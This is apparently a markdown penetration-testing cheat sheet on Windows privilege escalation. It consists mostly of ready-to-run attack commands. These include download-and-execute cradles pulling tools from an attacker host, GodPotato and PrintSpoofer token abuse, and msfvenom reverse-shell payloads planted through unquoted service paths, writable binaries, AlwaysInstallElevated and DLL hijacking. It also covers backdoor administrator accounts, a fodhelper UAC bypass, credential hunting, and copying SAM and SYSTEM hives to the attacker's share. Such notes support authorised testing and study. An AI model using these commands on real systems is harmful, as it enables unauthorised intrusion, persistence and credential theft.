# PrivEsc — Windows — [Back to Linux PrivEsc](privesc_main.md) | [Back to Main](../README.md)

## Auto Enumeration

```powershell
# WinPEAS — best all-in-one
certutil.exe -urlcache -f http://$LHOST:8000/winPEASx64.exe C:\Windows\Temp\wp.exe
C:\Windows\Temp\wp.exe

# PowerUp (pure PowerShell — good for AV evasion)
iex (New-Object Net.WebClient).DownloadString("http://$LHOST:8000/PowerUp.ps1")
Invoke-AllChecks
```

## First Things First — Check Privileges

```powershell
whoami /all
```

| Privilege | What you can do |
|---|---|
| `SeImpersonatePrivilege` | → SYSTEM via GodPotato (most common on service accounts) |
| `SeAssignPrimaryTokenPrivilege` | → SYSTEM via GodPotato |
| `SeBackupPrivilege` | Read any file — dump SAM/SYSTEM/NTDS.dit |
| `SeRestorePrivilege` | Write any file — drop DLL, overwrite service binary |
| `SeTakeOwnershipPrivilege` | Take ownership of any file/key |
| `SeDebugPrivilege` | Dump LSASS memory |
| `SeLoadDriverPrivilege` | Load malicious driver |

## Token Impersonation (SeImpersonatePrivilege)

Most common path from service account → SYSTEM.

```powershell
# GodPotato — works Server 2012–2022, Win 8–11
certutil.exe -urlcache -f http://$LHOST:8000/GodPotato.exe C:\Windows\Temp\gp.exe
C:\Windows\Temp\gp.exe -cmd "cmd /c whoami"
C:\Windows\Temp\gp.exe -cmd "cmd /c net user hacker Password123! /add && net localgroup administrators hacker /add"
C:\Windows\Temp\gp.exe -cmd "cmd /c C:\Windows\Temp\shell.exe"   # reverse shell as SYSTEM

# PrintSpoofer — Win10 / Server 2019 alternative
.\PrintSpoofer.exe -i -c cmd
.\PrintSpoofer.exe -c "C:\Windows\Temp\shell.exe"
```

## Service Exploits

### Unquoted Service Path

```powershell
# Find unquoted paths with spaces (excluding Windows system paths)
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "C:\Windows\\" | findstr /i /v """"

# Path: C:\Program Files\Some App\service.exe
# Windows tries in order: C:\Program.exe → C:\Program Files\Some.exe → C:\Program Files\Some App\service.exe
# If C:\Program Files\ is writable: place shell as C:\Program Files\Some.exe
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f exe -o "Some.exe"
# Restart the service:
sc stop "ServiceName"; sc start "ServiceName"
```

### Weak Service Binary Permissions

```powershell
# Can you write to the service binary?
icacls "C:\path\to\service.exe"
# (M) or (F) for your user = writable

# Replace binary with reverse shell, restart service
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f exe -o service.exe
# Copy over original, restart
sc stop "ServiceName"; sc start "ServiceName"
```

### Weak Service Config (sc.exe)

```powershell
# Can you change the binary path?
sc sdshow <ServiceName>   # look for your user having write perms

sc config <ServiceName> binpath= "cmd /c net user hacker Password123! /add"
sc stop <ServiceName>; sc start <ServiceName>
sc config <ServiceName> binpath= "cmd /c net localgroup administrators hacker /add"
sc stop <ServiceName>; sc start <ServiceName>
```

## Registry Exploits

### AlwaysInstallElevated

```powershell
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
# Both must return 0x1

# Create MSI payload and run — installs as SYSTEM
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f msi -o shell.msi
msiexec /quiet /qn /i C:\Windows\Temp\shell.msi
```

### Registry Autorun (writable binary)

```powershell
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run

# If a listed binary path is writable → replace it, wait for next login or restart
icacls "C:\path\to\autorun.exe"
```

## Scheduled Tasks

```powershell
schtasks /query /fo LIST /v | findstr /i "task\|run\|status\|user"

# If a task script/binary is writable and runs as SYSTEM:
icacls "C:\path\to\task\script.bat"
echo "net user hacker Password123! /add" >> "C:\path\to\task\script.bat"
```

## DLL Hijacking

```powershell
# On a pentest box — use Process Monitor (Procmon.exe):
# Filter: Result = NAME NOT FOUND, Path ends with .dll
# Identifies missing DLLs that processes search for in writable locations

# Generate DLL
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f dll -o missing.dll
# Drop in the writable path that's searched before the legitimate location
```

## Stored Credentials

```powershell
# Saved Windows credentials
cmdkey /list
runas /savedcred /user:DOMAIN\Administrator "C:\Windows\Temp\shell.exe"

# Credential files
dir /s /b C:\Users\ 2>nul | findstr /i "credential\|password\|vnc\|putty"
dir %APPDATA%\Microsoft\Credentials\   # DPAPI blobs

# Registry
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"   # autologon creds
reg query HKCU\Software\ORL\WinVNC3\Password
reg query HKCU\Software\TightVNC\Server

# Unattend / Sysprep files (plaintext or base64 passwords)
type C:\Windows\Panther\Unattend.xml
type C:\Windows\Panther\Unattended.xml
type C:\Windows\System32\Sysprep\sysprep.xml
```

**PT ONLY — LaZagne dumps all stored passwords:**
```powershell
.\laZagne.exe all
```

## SAM / NTDS.dit (with SeBackupPrivilege or admin)

```powershell
# Dump local hashes from registry (must be admin/SYSTEM)
reg save HKLM\SAM C:\Windows\Temp\sam
reg save HKLM\SYSTEM C:\Windows\Temp\system

# Transfer to LHOST:
copy C:\Windows\Temp\sam \\$LHOST\share\
copy C:\Windows\Temp\system \\$LHOST\share\

# Dump on LHOST:
impacket-secretsdump LOCAL -sam sam -system system
```

## UAC Bypass

```powershell
# Check UAC level first
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin
# 0 = elevate silently (no bypass needed), 5 = prompt (bypass needed)

# fodhelper bypass (Win10 — requires medium integrity user)
New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "cmd /c C:\Windows\Temp\shell.exe" -Force
Start-Process "C:\Windows\System32\fodhelper.exe"
```

## Credential Hunting

```powershell
# Config / text files
findstr /si "password" C:\*.txt C:\*.xml C:\*.ini C:\*.config C:\*.bat 2>nul
dir /s /b *pass* *cred* *.kdbx *.config 2>nul

# Web app configs
type C:\inetpub\wwwroot\web.config
type C:\xampp\htdocs\config.php

# Bash history (WSL)
type C:\Users\*\AppData\Local\Packages\*\LocalState\rootfs\root\.bash_history 2>nul
```
